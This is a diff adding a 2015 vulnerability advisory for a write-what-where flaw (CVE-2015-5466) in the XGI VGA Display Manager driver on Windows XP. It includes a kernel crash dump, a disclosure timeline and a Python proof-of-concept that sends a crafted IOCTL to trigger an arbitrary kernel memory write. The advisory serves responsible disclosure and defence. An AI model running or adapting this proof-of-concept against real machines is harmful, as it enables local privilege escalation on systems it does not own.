@@ -1,0 +1,160 @@
+KL-001-2015-004 : XGI Windows VGA Display Manager Arbitrary Write
+Privilege Escalation
+
+Title: XGI Windows VGA Display Manager Arbitrary Write Privilege Escalation
+Advisory ID: KL-001-2015-004
+Publication Date: 2015.09.01
+Publication URL:
+https://www.korelogic.com/Resources/Advisories/KL-001-2015-004.txt
+
+
+1. Vulnerability Details
+
+     Affected Vendor: Silicon Integrated Systems Corporation
+     Affected Product: XGI VGA Display Manager
+     Affected Version: 6.14.10.1090
+     Platform: Microsoft Windows XP SP3
+     CWE Classification: CWE-123: Write-what-where condition
+     Impact: Arbitrary Code Execution
+     Attack vector: IOCTL
+     CVE-ID: CVE-2015-5466
+
+2. Vulnerability Description
+
+     A vulnerability within the xrvkp module allows an attacker
+     to inject memory they control into an arbitrary location they
+     define. This vulnerability can be used to overwrite function
+     pointers in HalDispatchTable resulting in an elevation of
+     privilege.
+
+3. Technical Description
+
+     Windows XP Kernel Version 2600 (Service Pack 3) UP Free x86 compatible
+     Product: WinNt, suite: TerminalServer SingleUserTS
+     Built by: 2600.xpsp_sp3_qfe.101209-1646
+     Machine Name:
+     Kernel base = 0x804d7000 PsLoadedModuleList = 0x805540c0
+
+
+*******************************************************************************
+     *
+           *
+     *                        Bugcheck Analysis
+           *
+     *
+           *
+
+*******************************************************************************
+
+     Use !analyze -v to get detailed debugging information.
+     BugCheck 50, {ffff0000, 1, 804f3b76, 0}
+     Probably caused by : xrvkp.sys ( xrvkp+6ec )
+     Followup: MachineOwner
+     ---------
+
+     kd> kn
+     Call stack:  # ChildEBP RetAddr
+     00 f63fd9a0 8051cc7f nt!KeBugCheckEx+0x1b
+     01 f63fda00 805405d4 nt!MmAccessFault+0x8e7
+     02 f63fda00 804f3b76 nt!KiTrap0E+0xcc
+     03 f63fdad0 804fdaf1 nt!IopCompleteRequest+0x92
+     04 f63fdb20 806d3c35 nt!KiDeliverApc+0xb3
+     05 f63fdb20 806d3861 hal!HalpApcInterrupt+0xc5
+     06 f63fdba8 804fab03 hal!KeReleaseInStackQueuedSpinLock+0x11
+     07 f63fdbc8 804f07e4 nt!KeInsertQueueApc+0x4b
+     08 f63fdbfc f7b136ec nt!IopfCompleteRequest+0x1d8
+     09 f63fdc34 804ee129 xrvkp+0x6ec
+     0a f63fdc44 80574e56 nt!IopfCallDriver+0x31
+     0b f63fdc58 80575d11 nt!IopSynchronousServiceTail+0x70
+     0c f63fdd00 8056e57c nt!IopXxxControlFile+0x5e7
+     0d f63fdd34 8053d6d8 nt!NtDeviceIoControlFile+0x2a
+     0e f63fdd34 7c90e514 nt!KiFastCallEntry+0xf8
+     0f 0021f3e4 7c90d28a ntdll!KiFastSystemCallRet
+     10 0021f3e8 1d1add7a ntdll!ZwDeviceIoControlFile+0xc
+     11 0021f41c 1d1aca96 _ctypes!DllCanUnloadNow+0x5b4a
+     12 0021f44c 1d1a8db8 _ctypes!DllCanUnloadNow+0x4866
+     13 0021f4fc 1d1a959e _ctypes!DllCanUnloadNow+0xb88
+     14 0021f668 1d1a54d8 _ctypes!DllCanUnloadNow+0x136e
+     15 0021f6c0 1e07bd9c _ctypes+0x54d8
+     16 00000000 00000000 python27!PyObject_Call+0x4c
+
+
+4. Mitigation and Remediation Recommendation
+
+     No response from vendor; no remediation available.
+
+5. Credit
+
+     This vulnerability was discovered by Matt Bergin of KoreLogic
+     Security, Inc.
+
+6. Disclosure Timeline
+
+     2015.05.14 - Initial contact; requested security contact.
+     2015.05.18 - Second contact attempt.
+     2015.05.25 - Third contact attempt.
+     2015.07.02 - KoreLogic requests CVE from Mitre.
+     2015.07.10 - Mitre issues CVE-2015-5466.
+     2015.07.28 - 45 business days have elapsed since KoreLogic last
+                  attempted to contact SiS without a response.
+     2015.09.01 - Public disclosure.
+
+7. Proof of Concept
+
+     from sys import exit
+     from ctypes import *
+     NtAllocateVirtualMemory = windll.ntdll.NtAllocateVirtualMemory
+     WriteProcessMemory = windll.kernel32.WriteProcessMemory
+     DeviceIoControl = windll.ntdll.NtDeviceIoControlFile
+     CreateFileA = windll.kernel32.CreateFileA
+     CloseHandle = windll.kernel32.CloseHandle
+     FILE_SHARE_READ,FILE_SHARE_WRITE = 0,1
+     OPEN_EXISTING = 3
+     NULL = None
+
+     device = "xgikp"
+     code = 0x96002404
+     inlen = 0xe6b6
+     outlen = 0x0
+     inbuf = 0x1
+     outbuf = 0xffff0000
+     inBufMem = "\x90"*inlen
+
+     def main():
+     	try:
+      		handle = CreateFileA("\\\\.\\%s" %
+(device),FILE_SHARE_WRITE|FILE_SHARE_READ,0,None,OPEN_EXISTING,0,None)
+      		if (handle == -1):
+      			print "[-] error creating handle"
+      			exit(1)
+      	except Exception as e:
+      		print "[-] error creating handle"
+      		exit(1)
+
+NtAllocateVirtualMemory(-1,byref(c_int(0x1)),0x0,byref(c_int(0xffff)),0x1000|0x2000,0x40)
+      	WriteProcessMemory(-1,0x1,inBufMem,inlen,byref(c_int(0)))
+
+DeviceIoControl(handle,NULL,NULL,NULL,byref(c_ulong(8)),code,0x1,inlen,outbuf,outlen)
+      	CloseHandle(handle)
+      	return False
+
+     if __name__=="__main__":
+     	main()
+
+
+The contents of this advisory are copyright(c) 2015
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a
+proven track record of providing security services to entities
+ranging from Fortune 500 to small and mid-sized companies. We
+are a highly skilled team of senior security consultants doing
+by-hand security assessments for the most important networks in
+the U.S. and around the world. We are also developers of various
+tools and resources aimed at helping the security community.
+https://www.korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v1.0.txt
